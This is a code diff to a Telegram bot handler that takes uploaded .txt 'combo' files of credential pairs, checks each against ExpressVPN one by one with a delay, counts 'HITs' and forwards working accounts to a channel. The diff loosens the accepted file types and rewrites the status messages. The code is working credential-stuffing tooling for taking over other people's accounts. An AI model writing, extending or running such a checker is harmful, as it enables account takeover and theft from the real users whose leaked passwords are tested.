@@ -1,11 +1,9 @@
-// api/telegram.js – ExpressVPN Bot (simple, like 10 Minute School)
+// api/telegram.js – ExpressVPN Bot (accepts any .txt file)
 import { checkExpressVPN } from '../lib/expressChecker.js';
 import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';
 
 export default async function handler(req, res) {
-  if (req.method !== 'POST') {
-    return res.status(405).json({ error: 'Method not allowed' });
-  }
+  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
 
   const body = req.body;
   if (!body.message) return res.status(200).json({ ok: true });
@@ -25,22 +23,26 @@ export default async function handler(req, res) {
     return res.status(200).json({ ok: true });
   }
 
-  // ===== File upload =====
-  if (document && document.mime_type === 'text/plain') {
-    // 1. ফাইল ডাউনলোড
+  // ===== File upload — accept any .txt file =====
+  if (document && (
+      document.mime_type === 'text/plain' ||
+      document.mime_type === 'application/octet-stream' ||
+      (document.file_name && document.file_name.toLowerCase().endsWith('.txt'))
+  )) {
+    await sendMessage(chatId, `📥 Received *${document.file_name || 'file.txt'}*. Downloading...`);
+
     const fileUrl = await getFileUrl(document.file_id);
     if (!fileUrl) {
-      await sendMessage(chatId, "❌ Failed to get file.");
+      await sendMessage(chatId, "❌ Failed to get file from Telegram.");
       return res.status(200).json({ ok: false });
     }
 
     const fileContent = await downloadFile(fileUrl);
     if (!fileContent) {
-      await sendMessage(chatId, "❌ Failed to download file.");
+      await sendMessage(chatId, "❌ Failed to download file content.");
       return res.status(200).json({ ok: false });
     }
 
-    // 2. কম্বো পার্স
     const lines = fileContent.split(/\r?\n/);
     const combos = [];
     for (const line of lines) {
@@ -58,24 +60,26 @@ export default async function handler(req, res) {
       return res.status(200).json({ ok: false });
     }
 
-    // 3. টেলিগ্রামকে তাৎক্ষণিক রেসপন্স (টাইমআউট এড়াতে)
+    // Immediate response
     res.status(200).json({ ok: true });
-
-    // 4. ব্যাকগ্রাউন্ডে প্রসেসিং
     setTimeout(() => processCombos(chatId, combos), 100);
     return;
+  }
+
+  // Debug: unknown file type
+  if (document) {
+    await sendMessage(chatId, `⚠️ Unsupported file type: ${document.mime_type} | name: ${document.file_name || 'unknown'}`);
   }
 
   return res.status(200).json({ ok: true });
 }
 
-// ===== প্রসেসিং (সিরিয়াল, 300ms ডিলে) =====
 async function processCombos(chatId, combos) {
   const total = combos.length;
   let hits = 0;
   const startTime = Date.now();
 
-  await sendMessage(chatId, `📥 Received ${total} combos. Checking one by one...`);
+  await sendMessage(chatId, `🚀 Checking ${total} combos one by one...`);
 
   for (let i = 0; i < combos.length; i++) {
     const combo = combos[i];
@@ -86,33 +90,24 @@ async function processCombos(chatId, combos) {
       await forwardToChannel(result);
     }
 
-    // প্রতি ৫টি বা শেষে প্রগ্রেস
     if ((i + 1) % 5 === 0 || i + 1 === total) {
       await sendMessage(chatId, `⏳ Progress: ${i + 1}/${total} | HITs: ${hits}`);
     }
 
-    // 300ms ডিলে (10MS-এর মতো)
     await new Promise(r => setTimeout(r, 300));
   }
 
   const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-  let summary = `✅ *Checking complete!*\nTotal: ${total}\n🔥 HITS: ${hits}\n⏱️ Time: ${elapsed}s`;
-
-  await sendMessage(chatId, summary);
+  await sendMessage(chatId, `✅ *Done!*\nTotal: ${total}\n🔥 HITS: ${hits}\n⏱️ Time: ${elapsed}s`);
 }
 
-// ===== হেল্পার ফাংশন =====
 async function sendMessage(chatId, text) {
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   try {
     await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text,
-        parse_mode: 'Markdown'
-      })
+      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'Markdown' })
     });
   } catch (e) {}
 }
@@ -133,9 +128,7 @@ async function downloadFile(fileUrl) {
   try {
     const res = await fetch(fileUrl);
     return await res.text();
-  } catch (e) {
-    return null;
-  }
+  } catch (e) { return null; }
 }
 
 async function forwardToChannel(result) {
